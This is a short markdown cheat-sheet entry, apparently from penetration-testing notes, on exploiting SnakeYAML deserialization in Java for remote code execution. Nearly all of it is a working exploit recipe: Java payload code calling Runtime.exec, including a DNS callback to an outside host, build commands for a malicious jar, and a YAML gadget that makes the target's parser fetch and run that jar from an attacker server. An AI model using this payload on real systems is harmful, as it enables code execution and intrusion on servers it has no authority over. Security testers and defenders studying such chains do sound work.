# Vulnerabilities in programming languages

# Java

## SnakeYAML
SnakeYAML deserialization fails and allows for RCE.
### Steps
- Clone the following repo: [https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)     
- Edit the following part of `yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java`
    ```java
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    ```
- Compile and put everything into a `.jar` file
    ```bash
    javac src/artsploit/AwesomeScriptEngineFactory.java
    jar -cvf yaml-payload.jar -C src/ .
    ```
- Make a server to host the jar file
- Enter the following yaml code into the parse
    ```yaml
    !!javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader [[
        !!java.net.URL ["URL TO JAR FILE"]
    ]]
    ]
    ```

### Troubleshooting
- If the java version of the vulnerable yaml parser doesn't match your java version then recompile:
    ```bash
    javac --release <version> src/artsploit/AwesomeScriptEngineFactory.java
    jar -cvf yaml-payload.jar -C src/ .
    ```

### References
- [https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)
- [https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)
- [https://www.mankier.com/1/javac](https://www.mankier.com/1/javac)
- [https://stackoverflow.com/questions/47457105/class-has-been-compiled-by-a-more-recent-version-of-the-java-environment](https://stackoverflow.com/questions/47457105/class-has-been-compiled-by-a-more-recent-version-of-the-java-environment)